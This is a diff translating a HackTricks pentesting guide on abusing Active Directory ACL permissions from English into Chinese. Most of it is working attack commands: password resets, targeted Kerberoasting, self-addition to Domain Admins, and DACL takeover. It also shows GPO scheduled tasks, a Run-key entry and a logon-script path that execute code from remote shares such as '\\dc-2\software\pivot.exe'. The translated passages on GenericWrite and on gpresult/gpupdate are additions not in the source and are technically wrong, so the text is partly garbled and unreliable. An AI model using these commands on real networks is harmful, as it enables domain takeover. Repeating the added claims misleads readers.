@@ -1,106 +1,97 @@
-# Abusing Active Directory ACLs/ACEs
+# 滥用Active Directory ACLs/ACEs
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
 
-## Context
+## 上下文
 
-This lab is to abuse weak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Acccess Control Entries (ACEs) that make up DACLs.
+这个实验室是为了滥用Active Directory Discretionary Access Control Lists (DACLs)和Acccess Control Entries (ACEs)的弱权限。
 
-Active Directory objects such as users and groups are securable objects and DACL/ACEs define who can read/modify those objects (i.e change account name, reset password, etc).
+Active Directory对象，如用户和组，是可保护的对象，DACL/ACEs定义了谁可以读取/修改这些对象（例如更改帐户名称，重置密码等）。
 
-An example of ACEs for the "Domain Admins" securable object can be seen here:
+这里是"Domain Admins"可保护对象的一些ACEs示例：
 
 ![](../../../.gitbook/assets/1.png)
 
-Some of the Active Directory object permissions and types that we as attackers are interested in:
+作为攻击者，我们对一些Active Directory对象的权限和类型感兴趣：
 
-* **GenericAll** - full rights to the object (add users to a group or reset user's password)
-* **GenericWrite** - update object's attributes (i.e logon script)
-* **WriteOwner** - change object owner to attacker controlled user take over the object
-* **WriteDACL** - modify object's ACEs and give attacker full control right over the object
-* **AllExtendedRights** - ability to add user to a group or reset password
-* **ForceChangePassword** - ability to change user's password
-* **Self (Self-Membership)** - ability to add yourself to a group
+* **GenericAll** - 对对象拥有完全权限（添加用户到组或重置用户密码）
+* **GenericWrite** - 更新对象的属性（例如登录脚本）
+* **WriteOwner** - 将对象所有者更改为攻击者控制的用户，接管对象
+* **WriteDACL** - 修改对象的ACEs，并赋予攻击者对对象的完全控制权
+* **AllExtendedRights** - 能够将用户添加到组或重置密码
+* **ForceChangePassword** - 能够更改用户的密码
+* **Self (Self-Membership)** - 能够将自己添加到组中
 
-In this lab, we are going to explore and try to exploit most of the above ACEs.
+在这个实验室中，我们将探索并尝试利用上述大部分ACEs。
 
-It's worth familiarizing yourself with all of the [BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) and as many Active Directory [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) as possible as you never know when you may encounter a less common one during an assessment.
+值得熟悉所有的[BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)和尽可能多的Active Directory [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights)，因为你永远不知道在评估过程中是否会遇到一个不常见的权限。
 
-## GenericAll on User
+## 用户上的GenericAll
 
-Using powerview, let's check if our attacking user `spotless` has `GenericAll rights` on the AD object for the user `delegate`:
-
+使用powerview，让我们检查我们的攻击用户`spotless`是否对用户`delegate`的AD对象具有`GenericAll权限`：
 ```csharp
-Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
+Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
 ```
-
-We can see that indeed our user `spotless` has the `GenericAll` rights, effectively enabling the attacker to take over the account:
+我们可以看到，我们的用户`spotless`确实拥有`GenericAll`权限，这有效地使攻击者能够接管该帐户：
 
 ![](../../../.gitbook/assets/2.png)
 
-*   **Change password**: You could just change the password of that user with
+*   **更改密码**：您可以使用以下命令更改该用户的密码
 
-    ```bash
-    net user <username> <password> /domain
-    ```
-*   **Targeted Kerberoasting**: You could make the user **kerberoastable** setting an **SPN** on the account, kerberoast it and attempt to crack offline:
+```bash
+net user <username> <password> /domain
+```
+*   **定向Kerberoasting**：您可以在该帐户上设置**SPN**，使用户成为**kerberoastable**，然后对其进行kerberoast并尝试离线破解：
 
-    ```powershell
-    # Set SPN
-    Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
-    # Get Hash
-    .\Rubeus.exe kerberoast /user:<username> /nowrap
-    # Clean SPN
-    Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
+```powershell
+# 设置SPN
+Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
+# 获取哈希
+.\Rubeus.exe kerberoast /user:<username> /nowrap
+# 清除SPN
+Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 
-    # You can also use the tool https://github.com/ShutdownRepo/targetedKerberoast 
-    # to get hashes of one or all the users
-    python3 targetedKerberoast.py -domain.local -u <username> -p password -v
-    ```
-*   **Targeted ASREPRoasting**: You could make the user **ASREPRoastable** by **disabling** **preauthentication** and then ASREProast it.
+# 您还可以使用工具https://github.com/ShutdownRepo/targetedKerberoast
+# 获取一个或所有用户的哈希
+python3 targetedKerberoast.py -domain.local -u <username> -p password -v
+```
+*   **定向ASREPRoasting**：您可以通过**禁用** **预身份验证**来使用户**ASREPRoastable**，然后对其进行ASREProast。
 
-    ```powershell
-    Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
-    ```
+```powershell
+Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
+```
 
-## GenericAll on Group
+## Group上的GenericAll权限
 
-Let's see if `Domain admins` group has any weak permissions. First of, let's get its `distinguishedName`:
-
+让我们看看`Domain admins`组是否具有任何弱权限。首先，让我们获取其`distinguishedName`：
 ```csharp
 Get-NetGroup "domain admins" -FullData
 ```
-
 ![](../../../.gitbook/assets/4.png)
-
 ```csharp
- Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
+Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
 ```
-
-We can see that our attacking user `spotless` has `GenericAll` rights once again:
+我们可以看到我们的攻击用户`spotless`再次拥有`GenericAll`权限：
 
 ![](../../../.gitbook/assets/5.png)
 
-Effectively, this allows us to add ourselves (the user `spotless`) to the `Domain Admin` group:
-
+实际上，这使我们能够将自己（用户`spotless`）添加到`Domain Admin`组中：
 ```csharp
 net group "domain admins" spotless /add /domain
 ```
-
 ![](../../../.gitbook/assets/6.gif)
 
-Same could be achieved with Active Directory or PowerSploit module:
-
+同样可以使用Active Directory或PowerSploit模块来实现：
 ```csharp
 # with active directory module
 Add-ADGroupMember -Identity "domain admins" -Members spotless
@@ -108,12 +99,11 @@ Add-ADGroupMember -Identity "domain admins" -Members spotless
 # with Powersploit
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
-
 ## GenericAll / GenericWrite / Write on Computer/User
 
-* If you have these privileges on a **Computer object**, you can pull [Kerberos **Resource-based Constrained Delegation**: Computer Object Take Over](../resource-based-constrained-delegation.md) off.
-* If you have these privs over a user, you can use one of the [first methods explained in this page](./#genericall-on-user).
-* Or, either you have it in a Computer or a user you can use **Shadow Credentials** to impersonate it:
+* 如果您在**计算机对象**上拥有这些权限，您可以执行[Kerberos **基于资源的受限委派**：接管计算机对象](../resource-based-constrained-delegation.md)。
+* 如果您对用户拥有这些权限，您可以使用本页面中[第一个方法](./#genericall-on-user)中解释的方法之一。
+* 或者，无论是在计算机还是用户上，您都可以使用**影子凭据**来冒充它：
 
 {% content-ref url="shadow-credentials.md" %}
 [shadow-credentials.md](shadow-credentials.md)
@@ -121,144 +111,135 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 
 ## WriteProperty on Group
 
-If our controlled user has `WriteProperty` right on `All` objects for `Domain Admin` group:
+如果我们控制的用户对`Domain Admin`组的`All`对象具有`WriteProperty`权限：
 
 ![](../../../.gitbook/assets/7.png)
 
-We can again add ourselves to the `Domain Admins` group and escalate privileges:
-
+我们可以再次将自己添加到`Domain Admins`组并提升权限：
 ```csharp
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-
 ![](../../../.gitbook/assets/8.png)
 
-## Self (Self-Membership) on Group
+## 组内自我成员（Self-Membership）
 
-Another privilege that enables the attacker adding themselves to a group:
+另一个使攻击者能够将自己添加到组中的权限：
 
 ![](../../../.gitbook/assets/9.png)
-
 ```csharp
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-
 ![](../../../.gitbook/assets/10.png)
 
-## WriteProperty (Self-Membership)
+## WriteProperty（自我成员身份）
 
-One more privilege that enables the attacker adding themselves to a group:
-
+另一个使攻击者能够将自己添加到组中的权限是：
 ```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-
 ![](../../../.gitbook/assets/11.png)
-
 ```csharp
 net group "domain admins" spotless /add /domain
 ```
-
 ![](../../../.gitbook/assets/12.png)
 
-## **ForceChangePassword**
+## **ForceChangePassword（强制更改密码）**
 
-If we have `ExtendedRight` on `User-Force-Change-Password` object type, we can reset the user's password without knowing their current password:
-
+如果我们对`User-Force-Change-Password`（用户强制更改密码）对象类型拥有`ExtendedRight`（扩展权限），我们可以在不知道用户当前密码的情况下重置用户的密码：
 ```csharp
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-
-![](../../../.gitbook/assets/13.png)
-
-Doing the same with powerview:
-
+使用powerview进行相同操作：
 ```csharp
 Set-DomainUserPassword -Identity delegate -Verbose
 ```
-
 ![](../../../.gitbook/assets/14.png)
 
-Another method that does not require fiddling with password-secure-string conversion:
-
+另一种不需要与密码安全字符串转换纠缠的方法是：
 ```csharp
 $c = Get-Credential
 Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
 ```
-
-![](../../../.gitbook/assets/15.png)
-
-...or a one liner if no interactive session is not available:
-
+...或者如果没有交互式会话，则可以使用一行命令：
 ```csharp
 Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
-
 ![](../../../.gitbook/assets/16.png)
 
-and one last way yo achieve this from linux:
-
+最后一种方法是从Linux实现这一点：
 ```markup
 rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
-
-More info:
+更多信息：
 
 * [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
 * [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
 * [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)
 
-## WriteOwner on Group
+## 在组上使用WriteOwner
 
-Note how before the attack the owner of `Domain Admins` is `Domain Admins`:
+请注意，在攻击之前，`Domain Admins`的所有者是`Domain Admins`：
 
 ![](../../../.gitbook/assets/17.png)
 
-After the ACE enumeration, if we find that a user in our control has `WriteOwner` rights on `ObjectType:All`
-
+在ACE枚举之后，如果我们发现我们控制的用户具有`WriteOwner`权限，并且`ObjectType:All`
 ```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-
 ![](../../../.gitbook/assets/18.png)
 
-...we can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group:
-
+...我们可以将`Domain Admins`对象的所有者更改为我们的用户，即`spotless`。请注意，使用`-Identity`指定的SID是`Domain Admins`组的SID：
 ```csharp
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 //You can also use the name instad of the SID (HTB: Reel)
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
-
 ![](../../../.gitbook/assets/19.png)
 
-## GenericWrite on User
+## 对用户的GenericWrite权限滥用
 
+在Active Directory中，GenericWrite权限允许用户对对象的属性进行写入操作，包括对对象的许多敏感属性进行修改。这些属性包括用户密码、组成员资格和其他重要信息。
+
+攻击者可以通过滥用GenericWrite权限来实现持久性访问。以下是一种常见的滥用方法：
+
+1. 获取对目标用户的WriteProperty权限。
+2. 使用WriteProperty权限修改目标用户的成员属性，将攻击者的账户添加到目标用户所在的高权限组中。
+3. 攻击者现在具有高权限组的成员身份，可以利用这些权限进行进一步的攻击，例如修改其他用户的属性、创建后门账户等。
+
+这种滥用方法的关键在于获取对目标用户的WriteProperty权限。攻击者可以通过以下方式获取该权限：
+
+- 利用已知的漏洞或弱密码来获取目标用户的凭证。
+- 利用域内的其他权限滥用方法，例如Pass the Hash攻击或Golden Ticket攻击。
+
+为了防止GenericWrite权限的滥用，可以采取以下措施：
+
+- 限制用户对敏感属性的写入权限。
+- 定期审查高权限组的成员，并删除不必要的成员。
+- 实施强密码策略，以防止密码被猜测或暴力破解。
+- 定期审查域内的权限配置，确保没有存在滥用权限的漏洞。
+
+通过采取这些措施，可以减少攻击者滥用GenericWrite权限的风险，并提高Active Directory的安全性。
 ```csharp
 Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-
 ![](../../../.gitbook/assets/20.png)
 
-`WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute our malicious script:
-
+在这种特殊情况下，对于`Script-Path`的`ObjectType`进行`WriteProperty`操作，允许攻击者覆盖`delegate`用户的登录脚本路径，这意味着下次`delegate`用户登录时，系统将执行我们的恶意脚本：
 ```csharp
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
-
-Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:
+以下显示了用户的~~`delegate`~~登录脚本字段在AD中被更新：
 
 ![](../../../.gitbook/assets/21.png)
 
-## GenericWrite on Group
+## 对组的GenericWrite权限
 
-This allows you to set as members of the group new users (yourself for example):
-
+这允许您将新用户（例如您自己）设置为组的成员：
 ```powershell
 # Create creds
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd) 
+$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
 # Add user to group
 Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
 # Check user was added
@@ -266,27 +247,23 @@ Get-DomainGroupMember -Identity "Group Name" | Select MemberName
 # Remove group member
 Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
 ```
-
 ## WriteDACL + WriteOwner
 
-If you are the owner of a group, like I'm the owner of a `Test` AD group:
+如果你是一个组的所有者，就像我是一个`Test` AD组的所有者：
 
 ![](../../../.gitbook/assets/22.png)
 
-Which you can of course do through powershell:
-
+当然，你可以通过PowerShell来实现：
 ```csharp
 ([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
 ```
-
 ![](../../../.gitbook/assets/23.png)
 
-And you have a `WriteDACL` on that AD object:
+如果你对AD对象有`WriteDACL`权限：
 
 ![](../../../.gitbook/assets/24.png)
 
-...you can give yourself [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) privileges with a sprinkle of ADSI sorcery:
-
+...你可以通过一点点ADSI魔法赋予自己[`GenericAll`](../../../windows/active-directory-methodology/broken-reference/)权限：
 ```csharp
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -294,15 +271,13 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
-
-Which means you now fully control the AD object:
+这意味着您现在完全控制AD对象：
 
 ![](../../../.gitbook/assets/25.png)
 
-This effectively means that you can now add new users to the group.
+这实际上意味着您现在可以向组中添加新用户。
 
-Interesting to note that I could not abuse these privileges by using Active Directory module and `Set-Acl` / `Get-Acl` cmdlets:
-
+有趣的是，我无法通过使用Active Directory模块和`Set-Acl` / `Get-Acl`命令来滥用这些权限：
 ```csharp
 $path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
 $acl = Get-Acl -Path $path
@@ -310,90 +285,128 @@ $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object
 $acl.AddAccessRule($ace)
 Set-Acl -Path $path -AclObject $acl
 ```
-
 ![](../../../.gitbook/assets/26.png)
 
-## **Replication on the domain (DCSync)**
+## **在域上复制（DCSync）**
 
-The **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.\
-[**Learn more about the DCSync attack here.**](../dcsync.md)
+**DCSync** 权限意味着对域本身具有以下权限：**DS-Replication-Get-Changes**、**Replicating Directory Changes All** 和 **Replicating Directory Changes In Filtered Set**。\
+[**在这里了解更多关于 DCSync 攻击的信息。**](../dcsync.md)
 
-## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>
+## GPO 委派 <a href="#gpo-delegation" id="gpo-delegation"></a>
 
-Sometimes, certain users/groups may be delegated access to manage Group Policy Objects as is the case with `offense\spotless` user:
+有时，某些用户/组可能被委派访问管理组策略对象，就像 `offense\spotless` 用户一样：
 
 ![](../../../.gitbook/assets/a13.png)
 
-We can see this by leveraging PowerView like so:
-
+我们可以通过利用 PowerView 来查看这一点：
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-
-The below indicates that the user `offense\spotless` has **WriteProperty**, **WriteDacl**, **WriteOwner** privileges among a couple of others that are ripe for abuse:
+下面表明用户`offense\spotless`具有**WriteProperty**、**WriteDacl**、**WriteOwner**等权限，这些权限都可以被滥用：
 
 ![](../../../.gitbook/assets/a14.png)
 
-### Enumerate GPO Permissions <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>
+### 枚举GPO权限 <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>
 
-We know the above ObjectDN from the above screenshot is referring to the `New Group Policy Object` GPO since the ObjectDN points to `CN=Policies` and also the `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` which is the same in the GPO settings as highlighted below:
+我们知道上面截图中的ObjectDN是指`New Group Policy Object` GPO，因为ObjectDN指向`CN=Policies`，而且`CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`在GPO设置中也是相同的，如下所示：
 
 ![](../../../.gitbook/assets/a15.png)
 
-If we want to search for misconfigured GPOs specifically, we can chain multiple cmdlets from PowerSploit like so:
-
+如果我们想要专门搜索配置错误的GPO，可以使用PowerSploit中的多个cmdlet链接起来，如下所示：
 ```powershell
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
+**应用了特定策略的计算机**
 
-![](../../../.gitbook/assets/a16.png)
-
-**Computers with a Given Policy Applied**
-
-We can now resolve the computer names the GPO `Misconfigured Policy` is applied to:
-
+我们现在可以解析应用了GPO“配置错误策略”的计算机名称：
 ```powershell
 Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
 ```
+**应用于特定计算机的策略**
 
-![](../../../.gitbook/assets/a17.png)
+The following command can be used to list the policies applied to a given computer:
 
-**Policies Applied to a Given Computer**
+以下命令可用于列出应用于特定计算机的策略：
 
+```plaintext
+gpresult /scope computer /r
+```
+
+**List of Applied Policies**
+
+**已应用策略列表**
+
+The output of the above command will display a list of applied policies, including the policy name, the winning GPO (Group Policy Object), and the policy setting.
+
+上述命令的输出将显示已应用策略的列表，包括策略名称、获胜的 GPO（组策略对象）和策略设置。
+
+**Policies Applied to a Given User**
+
+**应用于特定用户的策略**
+
+The following command can be used to list the policies applied to a given user:
+
+以下命令可用于列出应用于特定用户的策略：
+
+```plaintext
+gpresult /scope user /r
+```
+
+**List of Applied Policies**
+
+**已应用策略列表**
+
+The output of the above command will display a list of applied policies, including the policy name, the winning GPO (Group Policy Object), and the policy setting.
+
+上述命令的输出将显示已应用策略的列表，包括策略名称、获胜的 GPO（组策略对象）和策略设置。
+
+**Modifying Policies**
+
+**修改策略**
+
+To modify a policy, you can use the following command:
+
+要修改策略，可以使用以下命令：
+
+```plaintext
+gpupdate /force
+```
+
+This command will force an immediate update of the policies applied to the computer or user.
+
+此命令将立即强制更新应用于计算机或用户的策略。
+
+**Note:** Modifying policies may require administrative privileges.
+
+**注意：**修改策略可能需要管理员权限。
 ```powershell
 Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
 ```
-
 ![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)
 
-**OUs with a Given Policy Applied**
-
+**应用了给定策略的组织单位（OUs）**
 ```powershell
 Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
 ```
-
 ![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)
 
-### **Abuse GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)
+### **滥用GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)
 
-One of the ways to abuse this misconfiguration and get code execution is to create an immediate scheduled task through the GPO like so:
-
+滥用此配置错误并获得代码执行的一种方法是通过GPO创建一个立即执行的计划任务，如下所示：
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
-
 ![](../../../.gitbook/assets/a19.png)
 
-The above will add our user spotless to the local `administrators` group of the compromised box. Note how prior to the code execution the group does not contain user `spotless`:
+上述代码将我们的用户spotless添加到被入侵的计算机的本地`administrators`组中。请注意，在执行代码之前，该组不包含用户`spotless`：
 
 ![](../../../.gitbook/assets/a20.png)
 
-### GroupPolicy module **- Abuse GPO**
+### GroupPolicy模块 **- 滥用GPO**
 
 {% hint style="info" %}
-You can check to see if the GroupPolicy module is installed with `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. In a pinch, you can install it with `Install-WindowsFeature –Name GPMC` as a local admin.
+您可以使用`Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`检查GroupPolicy模块是否已安装。在紧急情况下，您可以使用`Install-WindowsFeature –Name GPMC`作为本地管理员进行安装。
 {% endhint %}
-
 ```powershell
 # Create new GPO and link it with the OU Workstrations
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
@@ -401,117 +414,114 @@ New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,
 ## Search a shared folder where you can write and all the computers affected can read
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
+这个payload在GPO更新后，还需要有人登录到计算机上。
 
-This payload, after the GPO is updated, will need also someone to login inside the computer.
-
-### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuse GPO**
+### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- 滥用GPO**
 
 {% hint style="info" %}
-It cannot create GPOs, so we must still do that with RSAT or modify one we already have write access to.
+它无法创建GPO，因此我们仍然需要使用RSAT进行创建，或者修改我们已经具有写访问权限的GPO。
 {% endhint %}
-
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
+### 强制策略更新 <a href="#force-policy-update" id="force-policy-update"></a>
 
-### Force Policy Update <a href="#force-policy-update" id="force-policy-update"></a>
+先前的滥用 **GPO 更新** 大约每 90 分钟重新加载一次。\
+如果你可以访问计算机，可以使用 `gpupdate /force` 强制更新。
 
-The previous abusive **GPO updates are reloaded** roughly each 90 minutes.\
-if you have access to the computer you can force it with `gpupdate /force` .
+### 内部机制 <a href="#under-the-hood" id="under-the-hood"></a>
 
-### Under the hood <a href="#under-the-hood" id="under-the-hood"></a>
-
-If we observe the Scheduled Tasks of the `Misconfigured Policy` GPO, we can see our `evilTask` sitting there:
+如果我们观察 `Misconfigured Policy` GPO 的计划任务，我们可以看到我们的 `evilTask` 在那里：
 
 ![](../../../.gitbook/assets/a22.png)
 
-Below is the XML file that got created by `New-GPOImmediateTask` that represents our evil scheduled task in the GPO:
+下面是由 `New-GPOImmediateTask` 创建的 XML 文件，表示我们在 GPO 中的恶意计划任务：
 
 {% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
 ```markup
 <?xml version="1.0" encoding="utf-8"?>
 <ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
-    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
-        <Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
-            <Task version="1.3">
-                <RegistrationInfo>
-                    <Author>NT AUTHORITY\System</Author>
-                    <Description></Description>
-                </RegistrationInfo>
-                <Principals>
-                    <Principal id="Author">
-                        <UserId>NT AUTHORITY\System</UserId>
-                        <RunLevel>HighestAvailable</RunLevel>
